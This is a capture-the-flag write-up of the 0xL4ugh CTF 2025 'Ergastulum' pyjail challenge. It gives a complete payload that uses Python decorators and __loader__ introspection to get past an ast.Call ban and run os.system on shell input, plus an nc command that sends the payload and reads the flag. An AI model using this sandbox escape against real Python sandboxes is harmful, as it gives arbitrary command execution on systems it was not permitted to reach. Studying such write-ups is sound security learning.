# Ergastulum - Misc

- CTF: 0xL4ugh CTF 2025
- Category: Misc (Pyjail)
- Solver: W4ST3D
- Flag: `0xL4ugh{1_t0ld_y0u_N0_m3rcyyyyyy_99cb544533ee78ef}`

---

## Challenge
> "Do you enjoy Pyjails? Designed with zero mercy."

---

## Overview
An extremely restricted Python jail challenge. The jail restricts characters to `a-z 0-9 ( ) [ ] : . _ @ space newline`, bans critical AST nodes including `ast.Call`, and provides an empty `__builtins__` with only `__loader__` exposed. The solution abuses Python decorators to bypass the `ast.Call` restriction.

---

## Root Cause
Decorators in Python are stored in `decorator_list` and are NOT represented as `Call` nodes in the AST. This allows "calling" functions without triggering the `ast.Call` ban. Combined with `__loader__` introspection to access `sys.modules`, we can reach `os.system`.

---

## Exploitation Steps

### 1. Analyze Restrictions
- **Allowed Characters**: `a-z 0-9 ( ) [ ] : . _ @ space newline`
- **Banned AST Nodes**: `Import, ImportFrom, Call, If, Try, While, For, Return, Pass`
- **Environment**: Empty `__builtins__`, only `__loader__` exposed

### 2. Key Insight: Decorator Bypass
Decorators bypass the `ast.Call` ban:
```python
@some_function
def x():_
```
This executes `some_function(<function x>)` without using a `Call` node.

### 3. Build the Attack Chain
1. Access `sys` via `__loader__.get_code.__func__.__globals__['sys']`
2. Get string `'os'` by slicing `'posix'[1:3]` from `sys.builtin_module_names[27]`
3. Access `os.system` from `sys.modules['os']`
4. Access `builtins.input` from `sys.modules['builtins']`
5. Chain decorators to execute `os.system(input())`

### 4. Final Payload
```python
@__loader__.get_code.__func__.__globals__[__loader__.get_code.__func__.__code__.co_names[0]].modules[__loader__.get_code.__func__.__globals__[__loader__.get_code.__func__.__code__.co_names[0]].builtin_module_names[27][1:3]].system
@__loader__.get_code.__func__.__globals__[__loader__.get_code.__func__.__code__.co_names[0]].modules[__loader__.get_code.__func__.__globals__[__loader__.get_code.__func__.__code__.co_names[0]].builtin_module_names[21]].input
def x():_
```

### 5. Exploit
```bash
{ printf '%s\n' \
  '@__loader__.get_code.__func__.__globals__[__loader__.get_code.__func__.__code__.co_names[0]].modules[__loader__.get_code.__func__.__globals__[__loader__.get_code.__func__.__code__.co_names[0]].builtin_module_names[27][1:3]].system' \
  '@__loader__.get_code.__func__.__globals__[__loader__.get_code.__func__.__code__.co_names[0]].modules[__loader__.get_code.__func__.__globals__[__loader__.get_code.__func__.__code__.co_names[0]].builtin_module_names[21]].input' \
  'def x():_' \
  'end'; sleep 1; echo 'cat flag*'; sleep 1; } | nc -w 5 challenges3.ctf.sd 33286
```

---

## Techniques Used
- **Decorator abuse** to bypass `ast.Call` restriction
- **`__loader__` introspection** to access `_frozen_importlib` internals
- **Code object attributes** (`co_names`, `co_consts`) to extract strings without quotes
- **String slicing** (`'posix'[1:3] == 'os'`) to construct module names
- **`sys.modules`** traversal to access `os` and `builtins` modules

---

## Files
- `main.py`: Challenge source code
